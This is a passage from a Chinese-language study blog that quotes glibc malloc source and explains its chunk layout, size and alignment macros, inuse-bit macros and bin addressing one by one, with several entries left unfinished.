+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Where "chunk" is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but "mem" is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  "Nextchunk" is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk                            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:' |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:' |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot' of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The two exceptions to all this are</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1. The special chunk `top' doesn't bother using the</span></span><br><span class="line"><span class="comment">   trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">   that would have to index off it. After initialization, `top'</span></span><br><span class="line"><span class="comment">   is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">   MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">   bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">   allocated one-by-one, each must contain its own trailing size field.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment checks and conversions</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用是找到堆块 p 内用来存储 fd 指针的地址</p><p>说白了 <code>p</code> 就是用来存储当前堆块 <code>prev_size</code> 的地址，但是我们要的不是存储当前堆块 <code>prev_size</code> 和 <code>size</code> 的地址</p><p>用户输入的内容都是存储到<strong>那个存储 fd 指针的地址</strong>，也就是存储 size 的地址的下一个地址</p><p>fd 和 bk 都是在堆块空闲的时候才会存储在这个地址上，当堆块正在别使用的时候就是正常的存储区域</p><h3 id="mem2chunk-mem-宏"><a href="#mem2chunk-mem-宏" class="headerlink" title="mem2chunk(mem) 宏"></a>mem2chunk(mem) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用和 <strong>chunk2mem 宏</strong>是反过来的</p><p>由堆块内用于给用户输入的存储区地址找到堆块的起始地址，也就是用于存储当前堆块 prev_size 的地址</p><h3 id="MIN-CHUNK-SIZE-宏"><a href="#MIN-CHUNK-SIZE-宏" class="headerlink" title="MIN_CHUNK_SIZE 宏"></a>MIN_CHUNK_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><p>首先要了解 <strong>offsetof 宏</strong>的定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> offsetof(type,ident) ((size_t)&amp;(((type*)0)-&gt;ident))</span></span><br></pre></td></tr></table></figure><p>该宏通过一个结构体中的元素来获取该结构体的其实地址到该元素之间的距离</p><p>该宏的作用是规定一整个 chunk 的最小值是多少，包括 prev_size 域和 size 域</p><p>由此可以知道，在 32 位系统下，MIN_CHUNK_SIZE 的值大小是 0x10字节</p><p>在 64 位系统下，MIN_CHUNK_SIZE 的值大小是 0x20字节</p><h3 id="MINSIZE-宏"><a href="#MINSIZE-宏" class="headerlink" title="MINSIZE 宏"></a>MINSIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure><p>该宏用来规定最小的堆块的可用空间，也就是说申请的堆块至少有 MINSIZE 的大小</p><p>在 32 位下，MINSIZE 的值为0x10字节</p><p>在 64 位下，MINSIZE 的值为0x20字节</p><h3 id="aligned-OK-m-宏"><a href="#aligned-OK-m-宏" class="headerlink" title="aligned_OK(m) 宏"></a>aligned_OK(m) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>该宏用来判断申请到的堆块中的地址是否为对齐的地址</p><h3 id="misaligned-chunk-p-宏"><a href="#misaligned-chunk-p-宏" class="headerlink" title="misaligned_chunk(p) 宏"></a>misaligned_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>如果 <code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code></p><p>即如果 <code>long double</code> 对齐所需要的字节大于 <code>2 * sizeof(size_t)</code></p><p>则返回 p 的地址，也就是堆块的起始地址；否则返回该堆块 fd 指针所在的地址</p><p>一般的架构返回 <code>chunk2mem (p)</code> 的</p><h3 id="REQUEST-OUT-OF-RANGE-req-宏（缺）"><a href="#REQUEST-OUT-OF-RANGE-req-宏（缺）" class="headerlink" title="REQUEST_OUT_OF_RANGE(req) 宏（缺）"></a>REQUEST_OUT_OF_RANGE(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=                         \</span><br><span class="line">   (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="request2size-req-宏（缺）"><a href="#request2size-req-宏（缺）" class="headerlink" title="request2size(req) 宏（缺）"></a>request2size(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="checked-request2size-req-sz-宏（缺）"><a href="#checked-request2size-req-sz-宏（缺）" class="headerlink" title="checked_request2size(req, sz) 宏（缺）"></a>checked_request2size(req, sz) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                      \</span><br><span class="line">      __set_errno (ENOMEM);                         \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                               \</span><br><span class="line">    &#125;                                \</span><br><span class="line">  (sz) = request2size (req);</span><br></pre></td></tr></table></figure><p>待补充</p><h2 id="Physical-chunk-operations"><a href="#Physical-chunk-operations" class="headerlink" title="Physical chunk operations"></a>Physical chunk operations</h2><h3 id="PREV-INUSE-宏"><a href="#PREV-INUSE-宏" class="headerlink" title="PREV_INUSE 宏"></a>PREV_INUSE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前堆块的前一个堆块处于非空闲状态，规定值为 0x1</p><h3 id="prev-inuse-p-宏"><a href="#prev-inuse-p-宏" class="headerlink" title="prev_inuse(p) 宏"></a>prev_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>检查前一个堆块是否处于空闲状态</p><p>如果前一个堆块处于非空闲状态，则返回 0x1，否则返回 0</p><h3 id="IS-MMAPPED-宏"><a href="#IS-MMAPPED-宏" class="headerlink" title="IS_MMAPPED 宏"></a>IS_MMAPPED 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br></pre></td></tr></table></figure><p>该宏的意思的当前的堆块是通过 mmap() 得到的</p><h3 id="chunk-is-mmapped-p-宏"><a href="#chunk-is-mmapped-p-宏" class="headerlink" title="chunk_is_mmapped(p) 宏"></a>chunk_is_mmapped(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for mmap()'ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>检查当前堆块是否是通过 mmap() 得到的</p><p>如果是 mmap() 得到的，那么返回 0x2，否则返回 0</p><h3 id="NON-MAIN-ARENA-宏"><a href="#NON-MAIN-ARENA-宏" class="headerlink" title="NON_MAIN_ARENA 宏"></a>NON_MAIN_ARENA 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前 chunk 不属于主线程</p><h3 id="chunk-non-main-arena-p-宏"><a href="#chunk-non-main-arena-p-宏" class="headerlink" title="chunk_non_main_arena(p) 宏"></a>chunk_non_main_arena(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>检查当前 chunk 是否属于主线程</p><p>如果不属于主线程，那么返回 0x4，否则返回 0</p><h3 id="SIZE-BITS-宏"><a href="#SIZE-BITS-宏" class="headerlink" title="SIZE_BITS 宏"></a>SIZE_BITS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>表面看这个宏的返回值就是 7，也就是 <code>111B</code>，作用在下面的宏中有体现</p><h3 id="chunksize-p-宏"><a href="#chunksize-p-宏" class="headerlink" title="chunksize(p) 宏"></a>chunksize(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>得到堆块 p 中的 size 位的值，因为堆块是对齐的，所以后三位没有用而且也不算大小</p><p>此处清空后三位</p><h3 id="next-chunk-p-宏"><a href="#next-chunk-p-宏" class="headerlink" title="next_chunk(p) 宏"></a>next_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br></pre></td></tr></table></figure><p>mchunkptr 结构体指针变量的定义：<code>typedef struct malloc_chunk* mchunkptr;</code></p><p>该宏的作用就是得到当前堆块的下一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址加上<strong>当前堆</strong>大小 size ，那么得到的值就是下一个堆块的地址了</p><h3 id="prev-chunk-p-宏"><a href="#prev-chunk-p-宏" class="headerlink" title="prev_chunk(p) 宏"></a>prev_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br></pre></td></tr></table></figure><p>该宏的作用就是得到当前堆块的前一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址减去<strong>前一个堆</strong>大小 size，那么得到的值就是前一个堆块的地址</p><p>不过 pre_size 只有在前一个堆块处于空闲状态的时候才会在当前堆块中有值</p><h3 id="chunk-at-offset-p-s-宏"><a href="#chunk-at-offset-p-s-宏" class="headerlink" title="chunk_at_offset(p, s) 宏"></a>chunk_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>也是获得一个堆块的地址，不过是通过指定偏移大小的方式</p><h3 id="inuse-p-宏"><a href="#inuse-p-宏" class="headerlink" title="inuse(p) 宏"></a>inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract p's inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)                           \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;<span class="built_in">size</span> &amp; ~SIZE_BITS)))-&gt;<span class="built_in">size</span>) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>获取下一个堆块的 PREV_INUSE 位，也就是说该宏是用来判断当前堆块是否处于空闲状态的</p><p>若是处于空闲状态就返回1，否则返回 0</p><h3 id="set-inuse-p-宏"><a href="#set-inuse-p-宏" class="headerlink" title="set_inuse(p) 宏"></a>set_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)                           \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;<span class="built_in">size</span> &amp; ~SIZE_BITS)))-&gt;<span class="built_in">size</span> |= PREV_INUSE</span><br></pre></td></tr></table></figure><p>这个宏的作用就是通过当前堆块的大小及地址得到下一个堆块的地址</p><p>然后将下一个堆块的 PREV_INUSE 位设置为 1</p><h3 id="clear-inuse-p-宏"><a href="#clear-inuse-p-宏" class="headerlink" title="clear_inuse(p) 宏"></a>clear_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)                          \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;<span class="built_in">size</span> &amp; ~SIZE_BITS)))-&gt;<span class="built_in">size</span> &amp;= ~(PREV_INUSE)</span><br></pre></td></tr></table></figure><p>该函数的作用是清除掉 PREV_INUSE 位，<code>~(PREV_INUSE)</code> 的值是 -2</p><h3 id="inuse-bit-at-offset-p-s-宏"><a href="#inuse-bit-at-offset-p-s-宏" class="headerlink" title="inuse_bit_at_offset(p, s) 宏"></a>inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)                    \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;<span class="built_in">size</span> &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-inuse-bit-at-offset-p-s-宏"><a href="#set-inuse-bit-at-offset-p-s-宏" class="headerlink" title="set_inuse_bit_at_offset(p, s) 宏"></a>set_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                     \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;<span class="built_in">size</span> |= PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>set_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="clear-inuse-bit-at-offset-p-s-宏"><a href="#clear-inuse-bit-at-offset-p-s-宏" class="headerlink" title="clear_inuse_bit_at_offset(p, s) 宏"></a>clear_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                   \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;<span class="built_in">size</span> &amp;= ~(PREV_INUSE))</span><br></pre></td></tr></table></figure><p>类似于 <code>clear_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-head-size-p-s-宏"><a href="#set-head-size-p-s-宏" class="headerlink" title="set_head_size(p, s) 宏"></a>set_head_size(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，并且<strong>不会</strong>影响到该堆块的使用位</p><h3 id="set-head-p-s-宏"><a href="#set-head-p-s-宏" class="headerlink" title="set_head(p, s) 宏"></a>set_head(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，该方法<strong>会</strong>影响到该堆块的使用位</p><h3 id="set-foot-p-s-宏"><a href="#set-foot-p-s-宏" class="headerlink" title="set_foot(p, s) 宏"></a>set_foot(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure><p>设置下一个堆块的 prev_size 位，该宏只有在当前堆块为空闲堆块时才会使用</p><p>看样子这个宏是专门在下一个堆块的 prev_size 位设置当前堆块的大小的</p><p>而且就算是该堆块的地址被申请回来了，那么下一个堆块的 prev_size位也不会改变</p><h2 id="Internal-data-structures"><a href="#Internal-data-structures" class="headerlink" title="Internal data structures"></a>Internal data structures</h2><h3 id="mbinptr-结构体指针变量"><a href="#mbinptr-结构体指针变量" class="headerlink" title="mbinptr 结构体指针变量"></a>mbinptr 结构体指针变量</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   All internal state is held in an instance of malloc_state defined</span></span><br><span class="line"><span class="comment">   below. There are no other static variables, except in two optional</span></span><br><span class="line"><span class="comment">   cases:</span></span><br><span class="line"><span class="comment"> * If USE_MALLOC_LOCK is defined, the mALLOC_MUTEx declared above.</span></span><br><span class="line"><span class="comment"> * If mmap doesn't support MAP_ANONYMOUS, a dummy file descriptor</span></span><br><span class="line"><span class="comment">     for mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Beware of lots of tricks that minimize the total bookkeeping space</span></span><br><span class="line"><span class="comment">   requirements. The result is a little over 1K bytes (for 4byte</span></span><br><span class="line"><span class="comment">   pointers and size_t.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn't needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br></pre></td></tr></table></figure><p>跟 <code>mchunkptr</code> 差不多，不过是用在 bin（空闲堆块）里的</p><h3 id="bin-at-m-i-宏"><a href="#bin-at-m-i-宏" class="headerlink" title="bin_at(m, i) 宏"></a>bin_at(m, i) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))                \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure><p>该宏用于获得某种类型的 bins 的某一个 bin 的地址，且该 bins 的基地址下标是 1 ，而不能是 0</p><h3 id="next-bin-b-宏（缺具体）"><a href="#next-bin-b-宏（缺具体）" class="headerlink" title="next_bin(b) 宏（缺具体）"></a>next_bin(b) 宏（缺具体）</h3><figure class="highlight 